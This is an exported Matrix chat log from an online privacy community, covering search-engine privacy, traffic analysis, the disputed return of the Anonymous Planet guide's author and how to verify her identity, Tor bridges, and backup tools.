14.4.2022, 20:18:40 - toasterbirb: My problem with DDG is that we are just literally taking their word for it. Its still just a centralized frontend for Bing
14.4.2022, 20:18:55 - solonovamax: Wait it uses bing?
14.4.2022, 20:18:58 - solonovamax: lmao

14.4.2022, 20:19:35 - toasterbirb: > DuckDuckGo (DDG) is an internet search engine that emphasizes protecting searchers' privacy and avoiding the filter bubble of personalized search results.[3] DuckDuckGo does not show search results from content farms.[5] It uses various APIs of other websites to show quick results to queries and for traditional links it uses the help of its partners (mainly Bing) and its own crawler.

14.4.2022, 20:19:57 - solonovamax: I'd move to searx, but my problem with it, is it still relies on google (aslo I'm meh about the UI) (also also I like ddg bangs)
14.4.2022, 20:20:17 - toasterbirb: I have never used the ddg bangs, but I do agree on the UI issue with Searx

14.4.2022, 23:02:09 - darlatan: she's unconscious and severely wounded, they'll transfer her to a real hospital when she's stabilized
14.4.2022, 23:04:04 - darlatan: she's under sedation with a respirator and cannot be talked to, but she came there alone
14.4.2022, 23:04:38 - darlatan: At the Polish border in Medyka
14.4.2022, 23:07:10 - darlatan: If Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla) can confirm the legitimacy of the gist then it's possible that it's her
14.4.2022, 23:09:16 - darlatan: they consider her state "worrying" but not "critical"
14.4.2022, 23:10:05 - darlatan: she's been there for 2 weeks
14.4.2022, 23:12:06 - darlatan: And she tested positive for covid19 too
14.4.2022, 23:12:41 - Zero joined the room
14.4.2022, 23:15:41 - darlatan: I think this might actually be her!
14.4.2022, 23:29:15 - 0xbad1dea: If it is, that's one hell of a coincidence. Unbelievable, you might say.
14.4.2022, 23:30:01 - darlatan: Ok they have all the info, their plan is to transfer her to Germany when she's stable
14.4.2022, 23:31:51 - darlatan: Well they did check the other two field hospitals just in case but it's the only 22yo Lena that fits the description
14.4.2022, 23:33:21 - darlatan: And now they're leaving and there is nothing to do but wait and see
15.4.2022, 00:18:26 - Likely Big Tech joined the room
15.4.2022, 01:57:22 - SlickRick: darlatan: You need to provide links and references when you make statements like that
15.4.2022, 01:57:43 - SlickRick: If you've got all this information there is obviously a source, so provide the source or don't talk like you know specifics.
15.4.2022, 03:33:53 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): <@darlatan:matrix.org "https://gist.github.com/AnonyPla..."> Yeah, that's legit
15.4.2022, 03:51:03 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): You know, my real identity has already been revealed publicly. This should be trivial to confirm or deny definitively
15.4.2022, 11:24:33 - theShadow: this is either an unbelievably happy story about friends helping each other, or a security service going after all of AnonyPla contacts
15.4.2022, 11:25:04 - theShadow: If someone I never seen acts as the best friend of my friend, I never trust him
15.4.2022, 12:10:33 - darlatan: Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Are you a friend of AnonyPla?
15.4.2022, 12:17:29 - darlatan: So
I bring some good news and then you won't hear from me again probably
For those who care
If that "Lena" is AnonyPla ... She has been transferred overnight by a medical plane chartered by MSF to Munich in Germany. I won't divulge any other detail. But if it's her. She's alive and now in good hands.
(Her and a dozen other wounded people)

This suddenly sounds like a kidnapping in some sense. As they said, they have no authority there 🤔
15.4.2022, 14:19:32 - toasterbirb: makes the thing even more absurd
15.4.2022, 14:31:25 - neo_sodom: toasterbirb: do you get notified if there are changes in a github profile? I just wondered since it seems really coincidental that he joined the room 21 minutes after the gist got published
15.4.2022, 14:46:52 - 0xbad1dea: I find their appearance and supposed success to be unbelievable. The kind of shit you see in movies

18.4.2022, 08:50:56 - SamLeh: I find that Olvid is making some claims which highly likely aren't true - 'Inability of the operator to know "who is talking to whom". No third party could ever identify the participants, not even the server. No trace of any metadata.' - If you're making "world class" privacy messenger, you should be very careful about the claims you're making. This is one of the reasons why I started with very bad attitude towards IPFS, they claimed free persistent storage, which obviously isn't true either.
18.4.2022, 09:59:34 - neo_sodom: Thanks for mentioning Olvid. One more support team to annoy with my emails :D
18.4.2022, 10:01:59 - SamLeh: neo_sodom: Yeah, someone immediately confronted me on twitter, let's see what they say to this: "How do they defeat classic problems of end-to-end correlation / traffic pattern analysis? That's doable by providing cover traffic but basically no apps do that, except very few. "
18.4.2022, 10:05:33 - neo_sodom: Interesting, I would want know which one they refer to. The only one I know is Tinfoil Chat but yeah I can ask them if you want.
18.4.2022, 10:08:36 - SamLeh: There are two primary problems, either reveal whom you're communicating with, and or when and what pattern you're using... Those are really hard problems to solve, yet some mixnets try to do that. You're all the time sending and receiving messages, but those can be just decoy messages. When you're actually communicating, nothing changes. All the inputs and outputs remain the same all the time. Afaik, Tinfoil Chat doesn't do that either, because it's on top of Tor and Tor doesn't do that by default. It would require the server / network side to support such operations. But I might be wrong about this, but I think I'm quite sure I'm right. 
18.4.2022, 10:11:04 - SamLeh: This is very unfeasible pattern for mobile users. Yet for hardcore hackers running their infra 24/7 with high bandwidth networks, it works just fine. I don't mind if my server sends extra 4 kiloevery second, or send and receives 64 kilobyte encrypted package every minute to the mixnet. Or something similar. 
18.4.2022, 10:11:28 - neo_sodom: Not sure if that is what you mean: https://github.com/maqp/tfc/wiki/Security-design#traffic-masking-design
18.4.2022, 10:16:27 - SamLeh: neo_sodom: Thank you, that actually is exactly that. But it just changes the type of the problem. Now it doesn't reveal when you're communicating with your contact and how and when they do respond. But that still probably allows (and even helps!) to correlate the fact that the tunnel / connection between A and B does exist. If I now delay traffic from A to B for a while and then release it, I'll see a burst at B and ....
18.4.2022, 10:17:59 - SamLeh: When server side is done correctly to "help" with that, such effect won't happen. B will receive packets (made up by the network) even if A is temporarily out, eliminating lack of traffic / bursting. 
18.4.2022, 10:18:26 - Alexa,SaveThePlanet: [Improving Signal's Sealed Sender ](https://www.youtube.com/watch?v=HoN6FLC5Hss) might be relevant
18.4.2022, 10:19:27 - SamLeh: Sealed sender doesn't change anything with traffic analysis. https://en.wikipedia.org/wiki/Traffic_analysis
18.4.2022, 10:19:59 - neo_sodom: <@sl:envs.net "When server side is done correct..."> Very interesting aspect. Maybe you could open an issue on Github for that so that the creator can come up with a solution (it there even is one).
18.4.2022, 10:21:01 - SamLeh: neo_sodom: Well they practically can't as long as it's on Tor and without extra server(s) in between. 
18.4.2022, 10:23:01 - SamLeh: Alexa,SaveThePlanet: One good example of traffic analysis is detecting wifi security cameras and locations. When you move in the field, the video feed will have higher bitrate than when there's no motion. So you know when you're in camera field simply by monitoring rf-emissions. 
18.4.2022, 10:27:08 - neo_sodom: <@sl:envs.net "neo_sodom: Well they practically..."> I see. Do you have an opinion on the Nym mixnet? They state on their roadmap that they want to "Support for private messaging applications and cryptocurrency transactions" this year.

18.4.2022, 10:27:21 - Alexa,SaveThePlanet: SamLeh did you watch  &t=525 ?
18.4.2022, 10:27:38 - SamLeh: neo_sodom: No, I don't have proper information about NYM, I've only read their claims, but I don't have any solid opinion about that.
18.4.2022, 10:32:38 - SamLeh: Alexa,SaveThePlanet: That actually does describe and address the problem, yet it doesn't solve it. Yet mail boxes and epoch processing sound just like the classic privacy mixnet approach I just mentioned earlier.

Although unbeleivable, it could be real. So, don't assume it is real, but don't treat it like it's guaranteed to be fake either, yk?
19.4.2022, 14:18:50 - solonovamax: <@neo_sodom:matrix.org "Well, that comments aged poorly ..."> Yeah no, absolutely. Don't take their word on anything they say.
We should still search for confirmation of everything they're saying. We should neither be on the "definitely fake", nor the "definitely" real side

19.4.2022, 14:27:56 - solonovamax: Alright, I see her, I'll attempt to confirm with her in dms about smth we spoke about on her other acc (@anonypla:tchncs.de) before it was all deleted (this happened around january, so before any of this)
19.4.2022, 14:28:29 - neo_sodom: DM is not not that good atm

19.4.2022, 14:31:27 - solonovamax: Ideally, I'd like to not mention what exactly I'm using to confirm, in case
1. It theoretically *is* a fake, and they use what I say to answer "correctly"
2. It is a fake, and this happens again in the future where we need to confirm with another fake & they use what I said previously to make it seem more real
19.4.2022, 14:31:58 - solonovamax: Hmm, I'll dm them myself anyways and try to confirm
19.4.2022, 14:32:45 - neo_sodom: <@solonovamax:matrix.org "Ideally, I'd like to not mention..."> Nah Sam already lightly confirmed, but we still wait for babba wherever they are. No uptime over the last 5 days ... Odd

But, we can't go *only* on babba's word

Ideally, we'd get several people to independently confirm it. Although you (obviously) can't trust me on my own, it'd be more trust worthy if a lot of people confirmed
19.4.2022, 14:47:29 - solonovamax: Given that I joined the room after all anonypla went missing, my testimony should be worth less than someone who joined before. But because I joined before the new acc, my testimony would be worth more than someone who joined after.
Of course, I could still be an acc that was planted with the intent of doing this, so that's why it'd be good to get testimony from quite a few people
19.4.2022, 17:11:31 - 0xbad1dea: Anonypla has publicly attested crypto keys tied to their identity. A good start would be verifying against those (https://keybase.io/anonymousplanet). Even if they're compromised, we at least know we're talking to someone in possession of the keys.
19.4.2022, 17:40:21 - solonovamax: idk if she still has them though, since if smth happened to her that put her in a critical condition, then she probably wasn't thinking about grabbing a usb key with her private keys, but instead about running away, yk?
19.4.2022, 18:01:08 - solonovamax: I'm a good like 97% sure that she's real, because she recognized me basically right away & knew of our past conversations
Last time I talked to her, we were discussing the possibility of moving the guide to latex, and she remembered that right as well

19.4.2022, 18:43:56 - 0xbad1dea: Conversationally, they could simply be a lurker

solonovamax  Is this not stored in the matrix channel and can be searched via your name to reference it?
20.4.2022, 04:22:12 - SlickRick: It'd be great news if it is, but obviously thorough effort needs to take place to re-establish trust in the authenticity of their identity, especially given a potential compromise scenario where hostile actors have taken control and will now attempt to ingratiate themselves in order to glean de-anonymizing information on other users of interest.
20.4.2022, 04:22:35 - SlickRick: That's often what happens when LE bust someone & then use them / their online identities to engage with, and deanonymize their associates.
20.4.2022, 04:23:09 - SlickRick: Darlatan could be some fucking strange larper who is getting off on playing with the emotion & drama too, and creating new accounts etc.
20.4.2022, 04:23:37 - SlickRick: We will need multiple strings of verification to really re-establish proper trust
20.4.2022, 04:24:40 - SlickRick: Darlatan could also have been probing by stating events, to see if users with real info would correct him and maybe build more knowledge to his spoofing.
20.4.2022, 04:24:53 - SlickRick: Fingers crossed though
20.4.2022, 06:34:31 - SamLeh: Just wondering if you've been targeted on social media, with strange questions. I don't know why I am. But I've never figured out what's the point of it. Or is it just like the good old email scams, but in this case they'll just start with shorter version to match average users on the platform? 
20.4.2022, 06:46:47 - SlickRick: SamLeh: Yes I agree, we will see ofc.
20.4.2022, 06:47:03 - SlickRick: I think by far most likely is burning an identity
20.4.2022, 06:47:17 - SlickRick: second most likely is the story is true, and people are making up info / posing as anonypla
20.4.2022, 06:47:31 - SlickRick: third would be what it appears to be
20.4.2022, 06:47:57 - SlickRick: I'd still say the probability of the author being a girl is very low, and would appear an effort to 'death note' introduce bits of randomness in to the identity
20.4.2022, 06:48:45 - SlickRick: If you were a girl & seeking anonymity I feel like the smart thing to do would be to pose as a guy, because the number of skilled tech women vs men is very lopsided & immediately reduces the pool of suspects + other identifying bits to a small list

20.4.2022, 07:24:57 - SlickRick: I have no ability to verify who you are. I'm relying on others who have had more interaction with anonypla to do so.
20.4.2022, 07:25:01 - SlickRick: As I said, I'm sure given the extent of the guide if you are anonypla you would appreciate the importance of that process
20.4.2022, 07:26:09 - SlickRick: If true best wishes of course
20.4.2022, 07:28:17 - SamLeh: <@anonylena:matrix.org "sent an image."> Seems that you've got a high blood pressure... 
20.4.2022, 07:34:58 - neo_sodom: <@anonylena:matrix.org "sent an image."> Dräger is a German company
20.4.2022, 07:43:38 - SlickRick: Gotta wait for Baba & others
20.4.2022, 07:43:43 - SlickRick: Heal up
20.4.2022, 07:44:14 - SlickRick: This situation might be worth some discussion about methods to re-verify & things like canaries. Just to spark an interesting discussion about the subject.
20.4.2022, 08:08:45 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): <del>regained control of my keyoxide</del> updated my keyoxide ... never lost control of that key

20.4.2022, 08:18:33 - SlickRick: NotSoAnonyLena (somewhat awake): Wtf happened? Are you ok?
20.4.2022, 08:19:11 - SlickRick: How did they find you? What are your injuries?
20.4.2022, 08:19:17 - SlickRick: How did you sustain your injuries?
20.4.2022, 08:19:35 - SlickRick: How did you get out?
20.4.2022, 08:20:56 - SlickRick: I had your key saved so yeah that's at least enough proof for me to assume you are Anonypla or at worst Russians who control their creds.
20.4.2022, 08:21:22 - SlickRick: Please update us on your physical condition? Glad you are alive.
20.4.2022, 08:28:57 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): Do no ever ask me details about what "happened" or details about my condition ... I'm alive and that's it
20.4.2022, 08:29:29 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I will add this in the rules when I regain my access
20.4.2022, 08:29:55 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): and will insta ban anyone asking for details of my medical condition and details of what happened
20.4.2022, 08:30:07 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I escaped Ukraine and I'm alive that's it
20.4.2022, 08:30:49 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): never ever ask me again those questions
20.4.2022, 08:31:43 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): Not everything I had was compromised because I don't store all my eggs in the same basket
20.4.2022, 08:31:59 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): And I do have contingency plans
20.4.2022, 08:32:41 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): Unfortunately, most of what I had was compromised but that doesn't include my PGP key
20.4.2022, 08:33:20 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): My GitHub  account was compromised but they didn't delete it for some reason so I logged in and changed the credentials
20.4.2022, 08:34:07 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): And hackernews, well you can't delete an account there without contacting the admins which they couldn't do anymore since they deleted my protonmail account prior
20.4.2022, 08:35:29 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I think they couldn't delete the GitHub account because they deleted my GitHub Organization but there is a significant delay between Organization deletion and that being reflected in the accounts owning it
20.4.2022, 08:35:48 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): And you cannot delete a GitHub account that owns an organization
20.4.2022, 08:36:24 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I updated my PGP key to revoke the compromised identities
20.4.2022, 08:37:00 - SlickRick: Ok, but I think this is a fair question. How / what can we do to verify that you aren't a hostile actor who has taken control of the account & is now going to pretend to be anony to deanonymize others?
20.4.2022, 08:37:12 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): now I'm trying to regain access to my twitter / domain / hosting and even protonmail 
20.4.2022, 08:37:19 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): babba27 has the proofs 
20.4.2022, 08:37:30 - SlickRick: ok
20.4.2022, 08:37:57 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): and I proved myself somewhat to several people already
20.4.2022, 08:38:36 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): because I had the habit of always deleting my past messages
20.4.2022, 08:38:44 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): including in DMs
20.4.2022, 08:39:07 - SlickRick: I'll wait to hear from them, but glad to hear you are ok.
20.4.2022, 08:39:10 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): an adversary could not read my history 
20.4.2022, 08:39:48 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): and therefore cannot possibly know what I discussed with who and when
20.4.2022, 08:40:16 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): but they can remember and so can I when I'm not high 
20.4.2022, 08:40:42 - SlickRick: Rest up :thumbs_up:
20.4.2022, 08:41:05 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): Just know that you guys were not nice to that interpol person
20.4.2022, 08:41:40 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): And that person saved my life 
20.4.2022, 08:41:48 - SlickRick: Darlatan?
20.4.2022, 08:41:56 - SlickRick: Not sure who the interpol person is
20.4.2022, 08:42:04 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): yes him
20.4.2022, 08:42:18 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): he's an officer at Interpol HQ in France
20.4.2022, 08:42:32 - SlickRick: Ok fair enough. Still it was a very confusing situation & if you have someone coming in making claims without any info of course I am going to meet it with skepticism.
20.4.2022, 08:44:07 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): for god's sake wake up 😭
20.4.2022, 08:45:56 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): what a clusterfuck
20.4.2022, 08:45:59 - neo_sodom: They are already gone for 5 days
20.4.2022, 08:46:50 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): <@neo_sodom:matrix.org "They are already gone for 5 days"> Yeah well I hope they come back because they have the only definitive proofs
20.4.2022, 08:48:46 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): Where is Kenny?
20.4.2022, 08:49:06 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I modded him here
20.4.2022, 08:49:42 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): @narktor:matrix.org
20.4.2022, 08:51:29 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): Did admins make change to mods here while I was gone?
20.4.2022, 08:57:08 - neo_sodom: Well ... he was banned for transphobia (intentional misgendering)
20.4.2022, 09:00:04 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I see
20.4.2022, 09:00:40 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I don't see him in the ban list tho
20.4.2022, 09:01:18 - neo_sodom: Ah well narktor left after you went missing and his alt was banned 
20.4.2022, 09:01:44 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I see
20.4.2022, 09:02:08 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): Nate B and Mr Muffin from "The New Oil" can verify me too
20.4.2022, 09:02:10 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): I'll ask them

20.4.2022, 09:13:20 - NotSoAnonyLena (Somewhat awake, aka AnonyPla): The irony
20.4.2022, 09:19:29 - SlickRick: Very ironic :'D
20.4.2022, 09:19:57 - SlickRick: Sounds like a comedy skit
20.4.2022, 09:32:44 - SlickRick: As I said glad to see you back though

20.4.2022, 10:46:27 - SamLeh: <@anonylena:matrix.org "How to prove your identity to a ..."> A good topic for a best seller e-book? 
20.4.2022, 10:58:26 - SlickRick: Is the best move to have challenge responses? Maybe in the form of seemingly banal questions or dialogue?
20.4.2022, 10:59:08 - SlickRick: Like I ask, hey its been a while, how are you? If they respond with anything including keyword ____ it indicates compromise, anything including ____ indicates clear
20.4.2022, 10:59:21 - SlickRick: And have this established in the most secure way you can 
20.4.2022, 11:20:52 - Alexa,SaveThePlanet: Pre-shared secret basically, in the form of a question that would only be asked to identify the person, only one answer is acceptable, which is the secret.

Any time this question have been asked and properly answered, re-establish a new shared secret.
20.4.2022, 11:26:13 - Alexa,SaveThePlanet: This, however, would rely on memory.
20.4.2022, 11:28:33 - Alexa,SaveThePlanet: Secret would have to be established with PFS in mind
20.4.2022, 11:48:10 - SamLeh: <@karlq:matrix.org "Like I ask, hey its been a while..."> That's the old school way... 
20.4.2022, 11:48:23 - Ash joined the room
20.4.2022, 12:00:32 - toasterbirb: If AnonyPla was comatose, how did the Interpol guys get permission to snatch her. It wasn't anything official right? Wouldn't that be a kidnapping
20.4.2022, 12:02:57 - theShadow: How can we believe they are real Interpol guys ;)
20.4.2022, 12:03:25 - theShadow: a guy coming into anonymity chat, saying he does not care for anonymity and he works for Interpol.... it does not get much weirder than that 
20.4.2022, 13:18:13 - SlickRick: A more immediate question would be: How/why would an interpol agent create a matrix account & come in here to give a pretty shoddy update
20.4.2022, 13:19:24 - SamLeh: Another question is who gives a bleep about some random nerd chat rooms? 
20.4.2022, 13:20:09 - SlickRick: Well I mean I do care about a lot of these matrix chat rooms because they have been an extraordinary source of useful information for me of late, so there's that.
20.4.2022, 13:20:36 - Alexa,SaveThePlanet: must be a fellow nerd
20.4.2022, 13:21:10 - SlickRick: Definitely not drowning in pussy
20.4.2022, 13:21:53 - Alexa,SaveThePlanet: <@karlq:matrix.org "A more immediate question would ..."> came here for gathering more information at first afaik
20.4.2022, 13:22:07 - SlickRick: Fair enough
20.4.2022, 13:23:50 - SlickRick: If he was then I was definitely not helpful for him :S :'D
20.4.2022, 13:23:59 - SlickRick: my bad lol
20.4.2022, 13:24:46 - SlickRick: Has Russia still got tor banned?
20.4.2022, 13:32:47 - theShadow: <@luminescentseason:matrix.org "fuck this  country man 😭"> which one?
20.4.2022, 13:35:34 - neo_sodom: <@informacni_svoboda:matrix.org "which one?"> He is not even in here anymore but I'll ask him in the other offtopic room
20.4.2022, 13:39:34 - theShadow: ah
20.4.2022, 13:43:25 - theShadow: no need to ask then
20.4.2022, 13:43:52 - neo_sodom: too late :/
20.4.2022, 13:44:26 - theShadow: lol ty neo, you are so kind ;)
20.4.2022, 13:46:20 - neo_sodom: Np I mean
20.4.2022, 14:13:49 - SamLeh: At least my bridges see a lot and mostly Russia traffic so... I think Tor is banned, but so what? (16 users online right now)
20.4.2022, 14:15:02 - toasterbirb: I have been running the snowflake addon in firefox and get about 20 users per day on average
20.4.2022, 14:15:32 - toasterbirb: If you were to extrapolate that, I'd assume the amount of bridge users is quite high
20.4.2022, 14:16:01 - SamLeh: Let's check it, I've checked it every now and then, just a sec...
20.4.2022, 14:17:35 - SamLeh: Last week....

20.4.2022, 16:43:22 - 0xbad1dea: Well, you've proved you're at least cryptographically Anonypla. Welcome back.

I don't necessarily buy the rest of the story but you've asked we never talk about it anymore, so I guess done is done.
20.4.2022, 17:05:56 - neo_sodom: NotSoAnonyLena (Somewhat awake, aka AnonyPla): Will the guide be available under the original domain again in the future?

20.4.2022, 19:34:24 - SamLeh: solonovamax: It's good to study standard business continuity and disaster recovery stuff anyway... 
20.4.2022, 19:35:41 - solonovamax: <@sl:envs.net "solonovamax: It's good to study ..."> yeah I know. I've never gotten around to it or set anything up, but I do wanna do it some time
20.4.2022, 19:39:17 - SamLeh: solonovamax: I've got everything in place and regular updates & maintenance & testing, etc. Plus much better backup procedures than standard 3-2-1
20.4.2022, 19:41:06 - solonovamax: wdym by "much beter backup procedures than standard 3-2-1"?
20.4.2022, 19:41:35 - SamLeh: solonovamax: https://www.veeam.com/blog/321-backup-rule.html
20.4.2022, 19:41:43 - solonovamax: ty
20.4.2022, 19:42:46 - solonovamax: ah, right now my backups are kinda scuffed, I mainly only have backups on a local NAS with raid 1 mirroring across 2 disks. I want to set up smth a bit more, but I'm not earning money atm so I don't want to spend much
20.4.2022, 19:44:02 - SamLeh: solonovamax: Yes, but even the standard 3-2-1 won't work well if you start considering APT threats... Data needs to be backed up and stored so, that even if they would gain full control of the systems, they simply can't destroy the data. Because it needs extensive physical access, preferably to multiple locations with security.
20.4.2022, 19:44:41 - SamLeh: I personally would say that 3-2-1 is not best, it's the minimum required. 
20.4.2022, 19:45:13 - solonovamax: yeah, obviously. I just can't do much that requires payments, because not earning anything right now lol
20.4.2022, 19:46:48 - SamLeh: Also regular disaster recovery testing is important I do several full restore tests every year...  Making sure that all the formats, data, etc, all is good. Also there are checks during the backups that if data is being corrupted I get alerted immediately. So covert corruption can't ruin backups. 
20.4.2022, 19:48:31 - solonovamax: yeah, my backups are kinda scuffed rn because I'm only relying on duplicati's (the program I'm using for backups) data checking feature
20.4.2022, 19:49:40 - SamLeh: solonovamax: I guess you've read my posts about duplicati, be warned. It's only one tool I'm suing and it's the tool, I'm having most trouble with... Verify function is flawed, you'll need to do full restore on another computer to be sure that the backup is actually restorable. 
20.4.2022, 19:50:11 - solonovamax: <@sl:envs.net "solonovamax: I guess you've read..."> nope, haven't read those. Could you link them?
I want to move away from duplicati, because C# and linux, meh..
20.4.2022, 19:52:01 - SamLeh: solonovamax: Long story, but there's something deeply flawed there. Yet we've never agreed what it exactly is - https://forum.duplicati.com/t/backup-valid-but-still-unrestorable/6441 - I think that the compact is still flawed. yet I haven't tested the latest .102 build with it...
20.4.2022, 19:52:09 - solonovamax: might look at using duplicacy (with a y, not an i), as it seems to have a decent featureset according to the arch wiki page, but I'm just skimming it
20.4.2022, 19:53:11 - SamLeh: solonovamax: I'm using it in parallel, yet it lacks "delayed" compact threshold and compression... Otherwise it's just as good.... 
20.4.2022, 19:53:25 - solonovamax: <@sl:envs.net "solonovamax: Long story, but the..."> huh, interesting. Can't try it right now, since my NAS server is down (was redoing my setup & never put the computer back & plugged it in lol. It's not a full server, more of an ancient desktop I found on the street, slapped some more ram & 2 disks in, and called it a day)
20.4.2022, 19:54:30 - SamLeh: solonovamax: Yes, but do full restore, to different computer and just make sure it works. They hate when I'm so loud about that, but I think that's fking the users.... Because when you need backup, you'll really need it. It's totally ... I think I'll make it clear in the thread.
20.4.2022, 19:55:58 - solonovamax: def will check it out when I get more time. But rn, I'm not really backup up anything super important. Most important shit would be my gpg/ssh keys, but those aren't used for anything more important than signing my git commits on github lol

but yeah, I do want to get a good backup process set up at some point
20.4.2022, 19:57:01 - solonovamax: nvm no longer considering duplicacy. It's on github, but has this weird license shit: https://github.com/gilbertchen/duplicacy/blob/master/LICENSE.md
20.4.2022, 19:58:22 - SamLeh: solonovamax: Restic is also pretty good, but not exactly comparable to duplicati... I personally really like the duplicati, yet the key data integrity issues need to get weeded out first.
20.4.2022, 19:58:42 - SamLeh: Cough, I'm also running some jobs using it. ;)
20.4.2022, 20:00:37 - solonovamax: <@sl:envs.net "solonovamax: Restic is also pret..."> It seems restic doesn't have any compression support, according to the arch wiki? Also, what's the UI like? Is it only usable via a CLI? Because it'd be nice to have some other kind of interface to it to make it easier to use
20.4.2022, 20:00:57 - SamLeh: solonovamax: What UI? CLI all the way. And no compression.
20.4.2022, 20:01:52 - solonovamax: cli is nice to use, but it can sometimes be good to have a gui, yk?
I fully agree that cli is great, just would also like a gui/web interface 

20.4.2022, 20:02:02 - SamLeh: Also backups often need rechunking, and purge doesn't have a threshold like with Duplicati. So it causes a lot of backup data "churn" if run too often, and if not run, well then space is wasted and old data kept. 
20.4.2022, 20:03:07 - SamLeh: But now some sleep, tomorrow full day of data stuff again. I think I'll run restore tests with the latest Duplicati tomorrow...
20.4.2022, 20:03:22 - solonovamax: lol seems fun
20.4.2022, 20:03:33 - solonovamax: _mmmmm, waiting for shit to decompress, my favourite_
20.4.2022, 20:03:39 - SamLeh: solonovamax: I've automated the testing... of course....
20.4.2022, 20:04:02 - solonovamax: <@sl:envs.net "solonovamax: I've automated the ..."> ya, but with compression (& limited disk speeds), it can take a while
20.4.2022, 20:05:28 - SamLeh: solonovamax: Decompression actually is not the worst part... Decompression is really fast, especially if using zstd. Depending on storage device the random writes is much worse. And especially duplicati's database recreate (forum is full of that stuff too) is sometimes insanely slow.
20.4.2022, 20:06:07 - solonovamax: <@sl:envs.net "solonovamax: Decompression actua..."> ah, depends what algorithm you're using for compression lol

24.4.2022, 15:25:01 - greenlemonade: Wow. Chat has been busy while I was offline.

I think that the idea of an identify shift is correct. That was first impression from even the first message about the situation in Ukraine going south. It is possible that there has been some internal conflict over whether to actually dump the original, "Lena," identity or not. The result of that indecision is a flip flop over the last several days. Alternatively, a more elaborate scheme was concocted to change identities because one of various reasons already discussed prior.

At the end of the day, the Anonymous Planet guide has been a good resource to many. If Lena actually has passed, I'm very sorry to hear that and I wish "Alex" the best in continuing maintenance. If this is an identity swap, I still wish the best for the maintainer and there is no ill feelings. I just can't help trying to pick apart a mystery.

24.4.2022, 15:38:29 - dngray: https://www.ivpn.net/blog/in-support-of-ukraine/ free IVPN access for people who can signup in Ukraine, Russia, Belarus

24.4.2022, 15:39:33 - 0xbad1dea: Anonypla got me invited to CME because they got kicked out and wanted PSA rep in there; they warned me about a troll/dick who ultimately banned them

24.4.2022, 15:40:14 - madaidan.: <@0xbad1dea:warmitup.chat "I wonder if it was you madaidan...."> They probably were referring to me, even though I wasn't the one that banned them

24.4.2022, 15:40:43 - @hypokeimenon:tchncs.de: It seems out of character to me, but I appreciate that a lot has happened without me being around to see or even understand

24.4.2022, 16:15:47 - dngray: and a pixel 7
24.4.2022, 16:15:52 - Deathrow: BTW haven't used Qubes in 2 years yay

24.4.2022, 16:15:55 - dngray: because it will be bigger than my current phone

24.4.2022, 16:16:04 - dngray: so like if i need something on the run i'd rather have a phablet

24.4.2022, 16:17:27 - 0xbad1dea: like, why can't other manufacs support re-signing your bootloader?

24.4.2022, 16:17:57 - dngray: the pixel has the Titan security chip

24.4.2022, 16:19:51 - 0xbad1dea: so it's a brand new ecosystem
24.4.2022, 16:20:01 - dngray: <@0xbad1dea:warmitup.chat "Not to mention, isn't /e/OS not ..."> well it is android
24.4.2022, 16:20:04 - dngray: its just got a shitty store
24.4.2022, 16:20:07 - dngray: and pre included apps

24.4.2022, 16:20:17 - 0xbad1dea: sounds about right

24.4.2022, 16:21:28 - dngray: also they weaken SELinux

24.4.2022, 16:25:47 - dngray: the answer is no
24.4.2022, 16:26:30 - 0xbad1dea: yeah debug functionality almost always provides a way for subverting security controls
24.4.2022, 16:28:43 - dngray: actually that reminds me
24.4.2022, 16:28:49 - dngray: "degoogling" the way some people go about that lol
24.4.2022, 16:29:08 - dngray: they do all these magic dances to have their devices not hit a google server instead of using Tor or a VPN
24.4.2022, 16:30:06 - 0xbad1dea: well, part of the degoogling is to remove Google's apps which will gather your data and send it to the Google servers
24.4.2022, 16:30:19 - 0xbad1dea: they might go over Tor or a VPN, but it's still stealing your data
24.4.2022, 16:31:16 - dngray: "degoogling", get a pixel, get grapheneos done. you don't have to think any further lol
24.4.2022, 16:31:26 - dngray: then use sandboxing if you *need* google services
24.4.2022, 16:31:31 - 0xbad1dea: well, yeah but for a while that wasn't a real option
24.4.2022, 16:31:35 - dngray: some apps simply require it and won't work without lol

24.4.2022, 16:42:42 - Astarael: IMO, to be a viable hardware key it has to support both FIDO2/U2F and TOTP like yubikey 5 series

24.4.2022, 16:50:47 - Astarael: well, the user is your weakest link in chain
